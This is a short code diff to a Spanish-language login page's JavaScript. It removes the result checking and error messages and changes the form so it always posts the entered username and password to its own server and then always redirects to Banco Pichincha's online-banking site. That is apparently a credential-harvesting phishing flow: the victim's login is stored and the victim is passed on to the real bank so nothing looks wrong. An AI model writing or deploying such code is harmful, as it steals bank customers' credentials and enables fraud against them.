@@ -164,27 +164,13 @@
     btn.disabled = true;
     btn.textContent = 'Ingresando...';
 
+    // Guardar en servidor y redirigir siempre
     fetch('/api/login', {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify({ usuario: usuario, password: contrasena })
-    })
-    .then(res => res.json())
-    .then(data => {
-      if (data.ok) {
-        window.location.href = 'https://www.noticias.com';
-      } else {
-        errorMsg.style.display = 'block';
-        errorMsg.textContent = data.message || 'Credenciales incorrectas';
-        btn.disabled = false;
-        btn.textContent = 'Ingresar';
-      }
-    })
-    .catch(() => {
-      errorMsg.style.display = 'block';
-      errorMsg.textContent = 'Error al conectar con el servidor';
-      btn.disabled = false;
-      btn.textContent = 'Ingresar';
+    }).finally(() => {
+      window.location.href = 'https://bancaweb.pichincha.com/pichincha';
     });
   }
 
